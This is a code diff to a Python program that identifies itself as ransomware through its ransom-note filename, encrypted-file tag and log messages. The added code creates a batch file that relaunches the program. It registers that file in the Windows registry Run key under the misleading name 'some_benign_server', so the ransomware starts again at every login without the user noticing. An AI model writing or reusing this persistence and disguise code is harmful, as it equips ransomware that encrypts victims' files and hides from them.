@@ -8,7 +8,7 @@ import psutil
 from fastapi import FastAPI
 import uvicorn
 import multiprocessing
-
+import winreg as reg   
 
 EXPLANATION_FILENAME = 'YOUR_FILES_ENCRYPTED.txt'
 ENCRYPTED_FILE_TAG = 'ransom_encrypted'
@@ -191,10 +191,24 @@ async def main():
     print('Successully encrypted files')
  
       
+def persistence():
+    with open('start.bat','w') as f:
+        f.write('timeout /t 15\n')
+        f.write(f'CD \"{str(os.getcwd())}\"\n')
+        f.write('python main.py\nexit')
 
+
+
+    current_path = str(os.getcwd()) + '\\start.bat'       
+    key = reg.HKEY_CURRENT_USER
+    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
+    with reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) as open_:
+        reg.SetValueEx(open_,"some_benign_server",0,reg.REG_SZ,current_path)
+        reg.CloseKey(open_)
 
 def main_helper():
     #ctypes.windll.user32.MessageBoxW(0, str(os.getpid()), "ransomware_pid", 1)
+    persistence()
     print(f'ransomware main pid: {str(os.getpid())}')
     uvicorn.run("main:app", port=8074, host='127.0.0.1')
 
